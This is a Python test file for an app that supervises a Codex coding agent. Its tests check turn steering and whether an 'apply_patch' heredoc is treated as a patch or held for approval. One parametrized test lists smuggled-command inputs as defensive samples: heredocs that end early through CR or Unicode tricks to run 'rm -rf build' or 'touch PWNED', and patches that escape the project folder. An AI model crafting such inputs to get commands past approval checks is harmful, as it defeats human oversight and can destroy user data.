@pytest.mark.anyio
async def test_a_steer_goes_into_codexs_turn_and_none_after_it_ended(tmp_path):
    client = CodexNativeClient(launcher=FAKE_CODEX, **plan(
        tmp_path, [{"say": "working"}, {"await_steer": True}, {"say": "done"}]))
    took, usage, _said, _items, steer = await steered(client, tmp_path)
    assert took is True and usage.output_tokens == 120
    assert record(tmp_path)["steers"] == [{"threadId": "thr_1", "expectedTurnId": "turn_1", "input": [
        {"type": "text", "text": "use blue", "text_elements": []}]}]
    assert await steer("too late") is False  # (its turn is over: nothing is sent)
    assert len(record(tmp_path)["steers"]) == 1


@pytest.mark.anyio
async def test_a_steer_codex_refuses_is_not_taken_and_its_turn_goes_on(tmp_path):
    client = CodexNativeClient(launcher=FAKE_CODEX, **plan(
        tmp_path, [{"await_steer": True}, {"say": "done"}], steer="reject"))
    took, usage, said, _items, _steer = await steered(client, tmp_path)
    assert took is False and usage.output_tokens == 120 and "done" in "".join(said)


# --- 14. A patch it sends as a command (R175) -----------------------------------------------


def heredoc(body, tag="'EOF'", after=""):
    end = tag.strip("'\"")
    return f"apply_patch <<{tag}\n*** Begin Patch\n{body}\n*** End Patch\n{end}{after}"


ADD_B = "*** Add File: b.py\n+print('b')"


def test_at_auto_edit_a_patch_codex_runs_as_a_command_is_taken_as_a_patch_without_a_card(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": heredoc(ADD_B), "touches": {"b.py": "print('b')\n"}}, {"say": "Added."}])
    statuses = watched(client)
    cid, run_id = start(client, project_dir, provider, mode="auto_edit")
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    assert answers(native_app) == [(RUN, ACCEPT)]
    nothing_was_asked(snap, statuses)
    assert snap["commands"] == []  # on record as the patch it is, not a command
    assert [(t["name"], t["status"]) for t in snap["tool_calls"]] == [("write_file", "succeeded")]
    assert [(f["path"], f["status"]) for f in snap["file_changes"]] == [("b.py", "applied")]


def test_a_patch_command_with_anything_more_stays_a_command_card(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": heredoc(ADD_B, after="\nrm -rf build"), "touches": {"b.py": "x"}}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider, mode="auto_edit")
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    assert asked["command"].startswith("apply_patch <<'EOF'") and asked["status"] == "proposed"
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)] and not (project_dir / "b.py").exists()


@pytest.mark.parametrize("command", [
    heredoc(ADD_B, tag="EOF"),                          # unquoted: $(...) in it would run
    heredoc(ADD_B + "\nEOF\nrm -rf build\n+x"),         # a line ends the heredoc early
    heredoc(ADD_B, after="\nrm -rf build"),             # more after it
    "cd .. && " + heredoc(ADD_B),                       # more before it
    heredoc("*** Delete File: a.py\n+x"),               # a deletion with lines
    heredoc("*** Add File: b.py\nprint('b')"),          # a new file's line without its +
    heredoc("*** Frobnicate File: b.py"),               # not a patch's line
    heredoc("*** Add File: ../b.py\n+x"),               # out of the folder it runs in
    heredoc("*** Add File: /b.py\n+x"),                 # a whole path
    heredoc("*** Update File: a.py\n*** Move to: ../c.py\n@@\n+y"),
    # Review: Git Bash drops every CR of a `-c` line, so each of these ends the heredoc early.
    *(heredoc(f"*** Update File: a.py\n@@\n{line}\ntouch PWNED")
      for line in ("EOF\r\r", "\rEOF", "EO\rF", "E\rOF", "EOF\r")),
    heredoc(ADD_B).replace("\n", "\r\n"),               # (no CR at all, not even in pairs)
    heredoc(ADD_B, after="\u2028"),                     # a blank only Unicode calls one
    heredoc(ADD_B, tag="'EÖF'"),                        # a delimiter of more than ASCII
    heredoc("*** Update File: a.py\n@@\n *** Add File: x.py\n+x"),   # a header out of place
    heredoc("*** Update File: a.py\n@@\n\t*** End Patch\n+x"),
])
def test_only_a_whole_quoted_apply_patch_heredoc_is_a_patch(command):
    assert _heredoc_patch(command, "C:/p") is None


def test_a_patch_command_codex_gives_a_reason_for_stays_a_command_card(
    native_app, wait_run, project_dir  # noqa: F811
):
    # Review: its shell still starts - what makes a command a card at every level makes this one.
    client, provider, _ = native_app([
        {"run": heredoc(ADD_B), "touches": {"b.py": "x"}, "reason": "outside the sandbox"},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider, mode="auto_edit")
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    assert asked["command"].startswith("apply_patch") and asked["status"] == "proposed"
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)] and not (project_dir / "b.py").exists()


@pytest.mark.anyio
async def test_a_role_that_runs_no_commands_has_no_patch_command():
    # (Started natively it has no shell at all - B-301 - so this is the rule, not a run.)
    from app.agent.approvals_mixin import ApprovalsMixin
    ctx = SimpleNamespace(tools=("read_file", "write_file"), run_id="r")
    assert await ApprovalsMixin._runs_as_patch(  # type: ignore[arg-type]
        None, ctx, None, json.dumps({"command": heredoc(ADD_B)})) is False


def test_an_apply_patch_heredoc_reads_as_codexs_own_patch():
    body = ("*** Add File: b.py\n+one\n+two\n*** Update File: a.py\n*** Move to: c.py\n@@\n-x\n+y"
            "\n*** Delete File: d.py")
    changes = _heredoc_patch(heredoc(body, tag='"PATCH"') + "\n", str(Path("C:/p")))
    assert [(Path(p).name, how, diff) for p, how, diff in _files(changes)] == [
        ("b.py", "add", "one\ntwo\n"), ("a.py", "update", "@@\n-x\n+y\n"),
        ("c.py", "move from " + str(Path("C:/p") / "a.py"), None), ("d.py", "delete", "")]


def test_a_patch_command_that_fails_in_its_shell_is_on_record_as_a_failed_patch(
    native_app, wait_run, project_dir  # noqa: F811
):
    # (PowerShell has no heredoc: the likely end of one there, not measured.)
    client, provider, _ = native_app([
        {"run": heredoc(ADD_B), "output": "ParserError\n", "exit": 1}, {"say": "It failed."}])
    cid, run_id = start(client, project_dir, provider, mode="auto_edit")
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, ACCEPT)] and not (project_dir / "b.py").exists()
    assert not [f for f in snap["file_changes"] if f["status"] in ("applied", "in_copy")]
    assert not [t for t in snap["tool_calls"] if t["status"] in ("pending", "running")]


def test_at_full_auto_a_patch_command_to_a_workflow_is_a_card_and_declined_writes_nothing(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": heredoc("*** Add File: .github/workflows/x.yml\n+on: push"),
         "touches": {".github/workflows/x.yml": "on: push\n"}}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    # (A command naming .github is a card at every level: it stays the command it is.)
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    assert asked["command"].startswith("apply_patch") and asked["status"] == "proposed"
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)] and not (project_dir / ".github").exists()

